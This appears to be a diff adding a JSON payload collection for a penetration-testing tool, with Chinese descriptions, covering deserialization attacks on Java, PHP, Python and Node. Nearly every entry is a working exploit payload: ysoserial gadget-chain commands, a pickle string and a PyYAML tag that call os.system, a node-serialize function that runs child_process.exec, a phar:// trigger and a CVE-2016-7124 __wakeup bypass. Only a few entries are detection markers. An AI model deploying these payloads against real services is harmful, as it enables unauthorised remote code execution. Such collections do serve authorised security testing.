@@ -1,0 +1,140 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "反序列化",
+  "categories": ["Java 系", "PHP 系", "Python 系", "Node 系", "检测与辅助"],
+  "items": [
+    {
+      "id": "deser-java-dnslog",
+      "title": "Java 反序列化 DNSLog 探测",
+      "category": "Java 系",
+      "code": "使用 ysoserial 生成：java -jar ysoserial.jar URLDNS \"http://{{domain}}/\" > payload.bin",
+      "desc": "URLDNS 链只发起 DNS 请求，不依赖第三方库，适合无回显探测。",
+      "tags": ["deserialization", "java", "ysoserial", "dnslog"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "ysoserial 官方仓库"
+    },
+    {
+      "id": "deser-java-cc",
+      "title": "CommonsCollections 链",
+      "category": "Java 系",
+      "code": "java -jar ysoserial.jar CommonsCollections5 \"id\" > payload.bin",
+      "desc": "依赖 commons-collections 3.1，需根据目标 classpath 选择对应链。",
+      "tags": ["deserialization", "java", "commonscollections"],
+      "vars": [],
+      "risk": "attack",
+      "source": "ysoserial 官方仓库"
+    },
+    {
+      "id": "deser-java-jdk7",
+      "title": "JDK7u21 原生链",
+      "category": "Java 系",
+      "code": "java -jar ysoserial.jar Jdk7u21 \"id\" > payload.bin",
+      "desc": "不依赖第三方库，仅需特定 JDK 版本即可利用。",
+      "tags": ["deserialization", "java", "jdk"],
+      "vars": [],
+      "risk": "attack",
+      "source": "ysoserial 官方仓库"
+    },
+    {
+      "id": "deser-java-base64",
+      "title": "Base64 传输载荷",
+      "category": "检测与辅助",
+      "code": "base64 -w0 payload.bin",
+      "desc": "把二进制序列化数据编码为 Base64，便于放入 Cookie、Header 或表单字段。",
+      "tags": ["deserialization", "java", "encode"],
+      "vars": [],
+      "risk": "low",
+      "source": "通用手法"
+    },
+    {
+      "id": "deser-php-serialize",
+      "title": "PHP 对象序列化样例",
+      "category": "PHP 系",
+      "code": "O:8:\"stdClass\":1:{s:4:\"name\";s:5:\"hello\";}",
+      "desc": "标准 PHP 序列化格式，配合 __wakeup / __destruct 魔术方法构造利用链。",
+      "tags": ["deserialization", "php"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PHP 官方文档 serialize"
+    },
+    {
+      "id": "deser-php-padding-bypass",
+      "title": "属性数量膨胀绕过 __wakeup",
+      "category": "PHP 系",
+      "code": "O:4:\"Test\":2:{s:1:\"a\";s:5:\"hello\";}",
+      "desc": "把属性数量写大（CVE-2016-7124）可绕过 __wakeup 执行，仅影响 PHP 5.6.25 之前与 7.0.10 之前的版本。",
+      "tags": ["deserialization", "php", "bypass", "legacy"],
+      "vars": [],
+      "risk": "attack",
+      "source": "CVE-2016-7124"
+    },
+    {
+      "id": "deser-php-phar",
+      "title": "Phar 反序列化触发",
+      "category": "PHP 系",
+      "code": "phar://{{path}}/test.txt",
+      "desc": "Phar 文件在解析元数据时会触发反序列化，常见于 file_exists、getimagesize 等文件操作函数；路径需指向已上传的 phar 文件。",
+      "tags": ["deserialization", "php", "phar"],
+      "vars": [{ "name": "path", "label": "phar 文件路径", "placeholder": "upload/avatar.jpg", "example": "upload/avatar.jpg" }],
+      "risk": "attack",
+      "source": "PHP 官方文档 phar"
+    },
+    {
+      "id": "deser-python-pickle",
+      "title": "Python pickle 载荷",
+      "category": "Python 系",
+      "code": "cos\nsystem\n(S'id'\ntR.",
+      "desc": "pickle 反序列化可直接执行命令，属于高危设计缺陷。",
+      "tags": ["deserialization", "python", "pickle"],
+      "vars": [],
+      "risk": "attack",
+      "source": "Python 官方文档 pickle 安全警告"
+    },
+    {
+      "id": "deser-python-yaml",
+      "title": "PyYAML 不安全加载",
+      "category": "Python 系",
+      "code": "!!python/object/apply:os.system [\"id\"]",
+      "desc": "yaml.load 未使用 SafeLoader 时可实例化任意对象。",
+      "tags": ["deserialization", "python", "yaml"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PyYAML 官方文档"
+    },
+    {
+      "id": "deser-node-unserialize",
+      "title": "node-serialize 载荷",
+      "category": "Node 系",
+      "code": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+      "desc": "node-serialize 反序列化 IIFE 可直接执行代码，属于已知高危库。",
+      "tags": ["deserialization", "node", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "CVE-2017-5941"
+    },
+    {
+      "id": "deser-detect-java-magic",
+      "title": "Java 序列化魔数识别",
+      "category": "检测与辅助",
+      "code": "aced0005",
+      "desc": "Java 序列化流以十六进制 aced0005 开头，Burp 中可据此快速识别。",
+      "tags": ["deserialization", "java", "detect"],
+      "vars": [],
+      "risk": "low",
+      "source": "Java 序列化规范"
+    },
+    {
+      "id": "deser-detect-base64-magic",
+      "title": "Base64 魔数识别",
+      "category": "检测与辅助",
+      "code": "rO0AB",
+      "desc": "aced0005 的 Base64 形式，常见于 Cookie 与隐藏字段。",
+      "tags": ["deserialization", "java", "detect"],
+      "vars": [],
+      "risk": "low",
+      "source": "通用手法"
+    }
+  ]
+}
